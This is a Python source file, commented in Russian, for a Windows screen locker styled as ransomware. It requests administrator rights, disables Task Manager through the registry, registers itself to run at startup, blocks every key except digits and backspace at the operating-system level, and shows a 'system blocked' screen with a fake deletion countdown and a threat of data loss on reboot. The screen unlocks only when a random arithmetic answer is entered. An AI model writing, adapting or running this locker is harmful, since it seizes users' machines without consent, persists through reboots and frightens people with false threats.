import ctypes
import getpass
import os
import random
import socket
import sys
import tkinter as tk
import winreg
from multiprocessing import Process

import keyboard
import psutil
from playsound import playsound

RED, GREEN, ORANGE, GREY, BLACK = (
    "#ff0000",
    "#00ff00",
    "#ffa500",
    "#808080",
    "#0a0a0a",
)


# -------------------------------- Системные функции ----------------------- #
def set_registry_settings(disable=True):
    """Отключает/включает Диспетчер задач и управляет записью в автозагрузке."""
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
            )
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)

        value = 1 if disable else 0
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, value)
        winreg.CloseKey(key)

        run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        run_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, run_key_path, 0, winreg.KEY_SET_VALUE
        )
        if disable:
            app_path = os.path.realpath(sys.argv[0])
            winreg.SetValueEx(
                run_key, "SystemBlocker", 0, winreg.REG_SZ, app_path
            )
        else:
            try:
                winreg.DeleteValue(run_key, "SystemBlocker")
            except Exception:
                pass
        winreg.CloseKey(run_key)
    except Exception:
        pass


def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_as_admin():
    """Перезапускает текущий скрипт с запросом прав администратора."""
    if is_admin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()


def play_sound():
    """Воспроизводит аудиофайл (в данный момент путь пуст)."""
    try:
        playsound("")
    except Exception:
        pass
def block_keys():
    """Блокирует ввод всех клавиш на уровне ОС, кроме цифр и Backspace."""
    allowed_keys = {
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
        'backspace', 'clear'
    }

    def filter_keyboard_events(event):

        if event.name in allowed_keys:
            return True  
        
        return False

    keyboard.hook(filter_keyboard_events, suppress=True)



def update_stats(root, cpu_label, ram_perc_label, ram_gb_label):
    """Обновляет текстовые метки с данными о загрузке ЦП и ОЗУ."""
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory()

    cpu_label.config(text=f"Использование ЦП (%): {cpu}")
    ram_perc_label.config(text=f"Использование ОЗУ (%): {ram.percent}")
    ram_gb_label.config(
        text=f"Использовано ОЗУ (ГБ): {round(ram.used / 1e9, 2)}"
    )

    root.after(
        1000,
        lambda: update_stats(root, cpu_label, ram_perc_label, ram_gb_label),
    )


def get_sys_info():
    """Собирает имя пользователя и локальный IP-адрес системы."""
    try:
        user = getpass.getuser()
        ip = socket.gethostbyname(socket.gethostname())
        return f"USER: {user} | IP: {ip}"
    except Exception:
        return


current_answer = 0


def generate_math_problem():
    """Генерирует случайный пример и безопасно сохраняет ответ."""
    global current_answer
    a = random.randint(10, 99)
    b = random.randint(10, 99)
    op = random.choice(["+", "-"])

    if op == "+":
        result = a + b
    else:
        result = a - b

    current_answer = str(result)
    return f"Решите: {a} {op} {b} = ?"



# -------------------------------- Интерфейс ------------------------------- #
def window():
    """Создает и настраивает главное графическое окно блокировщика."""
    if not is_admin():
        run_as_admin()

    set_registry_settings(True)
    block_keys()

    root = tk.Tk()
    root.title("System")
    # root.attributes("-fullscreen", True)
    # root.attributes("-topmost", True)
    root.configure(bg=BLACK)
    root.config(cursor="pirate")
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    sound_process = Process(target=play_sound)
    sound_process.start()

    main_label = tk.Label(
        root,
        text="ВАША СИСТЕМА ЗАБЛОКИРОВАНА",
        fg=RED,
        bg=BLACK,
        font=("Courier New", 30, "bold"),
    )
    main_label.pack(pady=(50, 10))

    math_label = tk.Label(
        root,
        text=generate_math_problem(),
        fg=ORANGE,
        bg=BLACK,
        font=("Consolas", 18, "bold"),
    )
    math_label.pack(pady=10)

    sys_info = get_sys_info()
    tk.Label(root, text=sys_info, fg=GREY, bg=BLACK, font=("Consolas", 10)).pack()

    stats_frame = tk.Frame(root, bg=BLACK)
    stats_frame.pack(pady=20)

    cpu_label = tk.Label(
        stats_frame,
        text="Использование ЦП (%): 0",
        fg=GREEN,
        bg=BLACK,
        font=("Consolas", 12),
    )
    cpu_label.pack()

    ram_perc_label = tk.Label(
        stats_frame,
        text="Использование ОЗУ (%): 0",
        fg=GREEN,
        bg=BLACK,
        font=("Consolas", 12),
    )
    ram_perc_label.pack()

    ram_gb_label = tk.Label(
        stats_frame,
        text="Использовано ОЗУ (ГБ): 0",
        fg=GREEN,
        bg=BLACK,
        font=("Consolas", 12),
    )
    ram_gb_label.pack()

    warn_text = (
        "ВНИМАНИЕ! Не пытайтесь перезагружать или отключать ваш ПК. "
        "Это приведет к полной потере данных."
    )
    tk.Label(
        root, text=warn_text, fg=GREY, bg=BLACK, font=("Consolas", 10)
    ).pack(side="bottom", pady=20)

    timer_label = tk.Label(
        root, text="", fg=ORANGE, bg=BLACK, font=("Consolas", 20)
    )
    timer_label.pack(pady=10)

    password_entry = tk.Entry(
        root,
        font=("Consolas", 20),
        bg="#1a1a1a",
        fg="white",
        justify="center",
        cursor="pirate",
    )
    password_entry.pack(pady=10)
    password_entry.focus_set()

    def check():
        """Проверяет ответ. Если верно — снимает блокировки."""
        if password_entry.get() == current_answer:
            set_registry_settings(False)
            keyboard.unhook_all()
            sound_process.terminate()
            root.destroy()
        else:
            password_entry.delete(0, tk.END)
            main_label.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
            root.after(
                2000,
                lambda: main_label.config(text="ВАША СИСТЕМА ЗАБЛОКИРОВАНА"),
            )

    btn = tk.Button(
        root,
        text="Разблокировать",
        command=check,
        bg=RED,
        fg="white",
        font=("Consolas", 12, "bold"),
    )
    btn.pack(pady=10)

    def flash():
        """Создает эффект мигания главного заголовка."""
        color = main_label.cget("fg")
        main_label.config(fg="#1a1a1a" if color == RED else RED)
        root.after(600, flash)

    def countdown(seconds):
        """Отображает обратный отсчет времени на экране."""
        if seconds > 0:
            m, s = divmod(seconds, 60)
            timer_label.config(text=f"Удаление через: {m:02d}:{s:02d}")
            root.after(1000, countdown, seconds - 1)
        else:
            pass

    flash()
    countdown(600)
    update_stats(root, cpu_label, ram_perc_label, ram_gb_label)
    root.mainloop()


if __name__ == "__main__":
    window()
